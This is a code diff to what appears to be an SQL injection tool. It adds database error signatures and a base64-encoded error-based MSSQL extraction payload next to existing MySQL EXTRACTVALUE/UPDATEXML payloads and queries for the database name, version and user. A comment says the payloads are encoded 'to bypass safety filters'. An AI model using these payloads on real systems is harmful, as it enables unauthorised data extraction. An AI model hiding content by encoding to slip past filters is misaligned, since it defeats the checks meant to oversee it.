@@ -22,6 +22,7 @@ SQL_ERROR_PATTERNS = [
     "unclosed quotation mark after the character string",
     "quoted string not properly terminated",
     "invalid column name",
+    "sqlsrv_fetch_array()",
 
     # Oracle
     "ora-00933: sql command not properly ended",
@@ -46,6 +47,11 @@ SQL_ERROR_PATTERNS = [
     "invalid syntax",
     "incorrect syntax",
     "unclosed quote",
+    "database error",
+    "syntax error near",
+    "unexpected",
+    "invalid query",
+    "query failed",
 ]
 
 # Simple payloads designed to trigger database errors.
@@ -95,13 +101,16 @@ EXTRACTION_PAYLOADS_B64 = {
     "error_based_mysql": [
         "IEFORCBFWFRSQUNUVkFMVUUoUkFOREAoKSxDT05DQVQoMHg3ZSwoe3F1ZXJ5fSkpKQ==", # AND EXTRACTVALUE(RAND(),CONCAT(0x7e,({query})))
         "IEFORCBVUERBVEVYTUwoUkFOREAoKSxDT05DQVQoMHg3ZSwoe3F1ZXJ5fSkpLFJBTkQoKSk="  # AND UPDATEXML(RAND(),CONCAT(0x7e,({query})),RAND())
+    ],
+    "error_based_mssql": [
+        "IEFORCAxPUNPTlZFUlQoaW50LCAoe3F1ZXJ5fSkp" # AND 1=CONVERT(int, ({query}))
     ]
 }
 
 # Specific queries to be used with extraction payloads.
 # B64 encoded to bypass safety filters.
 EXTRACTION_QUERIES_B64 = {
-    "database_name": "REFUQUJBU0UoKQ==", # DATABASE()
+    "database": "REFUQUJBU0UoKQ==", # DATABASE()
     "version": "VkVSU0lPTigp",         # VERSION()
     "user": "VVNFUigp"               # USER()
 }
